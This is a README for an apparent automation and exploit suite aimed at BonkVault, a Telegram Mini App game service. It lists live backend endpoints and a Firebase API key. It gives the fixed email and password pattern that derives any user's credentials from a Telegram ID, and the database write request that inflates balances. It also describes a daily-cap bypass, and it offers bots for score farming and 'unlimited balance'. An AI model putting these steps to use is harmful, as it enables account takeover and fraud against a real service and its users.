# BonkVault Reverse Engineered API & Automation Suite

Reverse engineered API map, automated farming tools, and security research findings for the BonkVault (`https://bonkvault.ai.studio`) Telegram Mini App.

## Features
- **Headless Firebase REST Auth**: Directly derives credentials and exchanges JWTs via Google Identity Toolkit REST API without browser emulation.
- **Automated Game Farming**: Loops through all mini-games (`coin-catcher`, `fruit-ninja`, `candy-match`, `2048-mini`, `word-game`, `quick-quiz`) crediting chances and submitting maximum scores.
- **Security Audit & Exploit Documentation**: Details of Firebase RTDB permission flaws and server-side balance ratification.
- **Zero Third-Party Dependencies**: Pure Node.js standard library (`https`, `fs`, `path`).

---

## Usage

### 1. Configuration
Set your Telegram user ID via environment variable or `.env`:
```bash
export TELEGRAM_ID="12345678"
```
*(If omitted, defaults to the configured research ID).*

### 2. Run Clean Game Farming
Plays rounds across all available mini-games with rate-limit pauses:
```bash
node bonkvault_farm.js [rounds_per_game]
# example: node bonkvault_farm.js 5
```

### 3. Run All-Games Test Runner
Verifies chance crediting, round start, and reward submission across all 6 games:
```bash
node bonkvault_all_games.js
```

### 4. Inspect RTDB & User Profile
Connects to Firebase Realtime Database and inspects user state:
```bash
node bonkvault_auth_rtdb.js
```

### 5. Run Exploit / Unlimited Balance Research Tool
Demonstrates RTDB balance inflation combined with server round ratification:
```bash
node bonkvault_exploit_bot.js
```

---

## Architecture & Authentication

- **Frontend / Mini-App**: `https://bonkvault.ai.studio`
- **Backend API (Cloud Run)**: `https://bonkvault-api-hmggaiawat-uc.a.run.app` / `https://bonkvault.ai.studio/api`
- **Database**: Google Firebase Realtime Database (`https://bonkvault-e1924-default-rtdb.firebaseio.com`)

### Auth Protocol
1. **Account Registration**:
   `POST https://bonkvault.ai.studio/api/telegram/register-user` with `{ id, username, firstName }`.
2. **REST Authentication**:
   Deterministic credentials:
   - Email: `tg_${TELEGRAM_ID}@bonkvault.local`
   - Password: `Tg${TELEGRAM_ID}!bonkAuth`
   `POST https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyD_nS4KFdBPT_esKu4_tSKMI2ClVGxv0Cg`
   Yields `idToken` (JWT) and `localId` (Firebase UID).

---

## Game API Lifecycle

All game requests require header: `Authorization: Bearer <idToken>`.

1. **Check Status**: `GET /api/${game}/status?uid=${FIREBASE_UID}`
2. **Credit Chance**: `POST /api/${game}/credit-chance` with `{ uid }`
3. **Start Round**: `POST /api/${game}/start-round` with `{ uid }` → returns `{ roundId, durationSeconds }`
4. **Submit Round**: `POST /api/${game}/submit-round` with `{ uid, roundId, score }` → returns `{ success, newBalance, baseReward, pointsAwarded }`

---

## Security Vulnerability Details

1. **Permissive RTDB Security Rules**:
   Client Firebase tokens can directly write to arbitrary user paths (`/users/${uid}/availableBalance`, `/users/${uid}/dailyEarned`, `/users/${uid}/*Chances`) via `PUT https://bonkvault-e1924-default-rtdb.firebaseio.com/users/${uid}/availableBalance.json?auth=${idToken}`.
2. **Server-Side Trust Flaw**:
   When verifying game rounds, the server reads the current `availableBalance` from RTDB and executes:
   $$\text{newBalance} = (\text{RTDB } availableBalance) + \text{baseReward}$$
   This ratifies client-modified database values into authoritative balance states.
3. **Daily Cap Bypass**:
   Writing `dailyEarned = 0` completely resets daily earning limits.

---

## Files
- `bonkvault_farm.js` — Main farming loop across all games
- `bonkvault_all_games.js` — All-games test runner
- `bonkvault_exploit_bot.js` — Full exploit demonstration bot
- `bonkvault_auth_rtdb.js` — REST auth & RTDB data structure explorer
- `.env.example` — Environment configuration template
